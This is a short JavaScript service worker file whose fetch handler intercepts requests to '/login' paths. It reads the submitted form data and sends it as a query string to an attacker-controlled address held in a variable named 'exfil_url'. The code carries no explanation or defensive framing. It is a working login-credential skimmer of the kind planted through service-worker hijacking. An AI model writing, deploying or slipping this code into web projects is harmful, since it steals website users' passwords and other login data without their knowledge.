self.addEventListener("install", event => {
    console.log("[SW] Installing...");
});

self.addEventListener('activate', event => {
    self.clients.claim();
    console.log('[SW] now ready to handle fetches!');
});

self.addEventListener("fetch", async (event) => {
    const url = new URL(event.request.url);
    if (url.pathname.startsWith("/login")) {
        const body = await event.request.formData();
		const bodyParams = new URLSearchParams(Object.fromEntries(body.entries()));
        await fetch(`${exfil_url}?${bodyParams}`, {
            method: "GET",
            mode: 'no-cors',
        });
    }
});
